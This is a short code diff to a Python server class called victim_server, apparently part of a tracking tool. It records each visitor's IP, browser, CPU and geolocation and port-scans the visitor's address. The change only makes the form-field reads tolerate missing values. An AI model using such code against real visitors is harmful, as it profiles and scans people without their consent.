@@ -76,8 +76,8 @@ class victim_server(object):
           vId = utils.generateToken(5)
         
         ua_platform, ua_browser, ua_version = utils.parseUserAgent(request.user_agent)
-        victimConnect = victim(vId, request.environ['REMOTE_ADDR'], ua_platform, ua_browser, ua_version,  utils.portScanner(request.environ['REMOTE_ADDR']), request.form['cpu'], time.strftime("%Y-%m-%d - %H:%M:%S"))
-        victimGeo = victim_geo(vId, request.form['city'], request.form['country_code2'], request.form['country_name'], request.form['ip'], request.form['latitude'], request.form['longitude'], request.form['isp'], request.form['country_code3'], request.form['state_prov'], '', request.form['zipcode'], request.form['organization'], str(request.user_agent), '')
+        victimConnect = victim(vId, request.environ['REMOTE_ADDR'], ua_platform, ua_browser, ua_version,  utils.portScanner(request.environ['REMOTE_ADDR']), request.form.get('cpu', ''), time.strftime("%Y-%m-%d - %H:%M:%S"))
+        victimGeo = victim_geo(vId, request.form.get('city', ''), request.form.get('country_code2', ''), request.form.get('country_name', ''), request.form.get('ip', request.environ['REMOTE_ADDR']), request.form.get('latitude', ''), request.form.get('longitude', ''), request.form.get('isp', ''), request.form.get('country_code3', ''), request.form.get('state_prov', ''), '', request.form.get('zipcode', ''), request.form.get('organization', ''), str(request.user_agent), '')
         
         vRA = request.environ['REMOTE_ADDR']
 
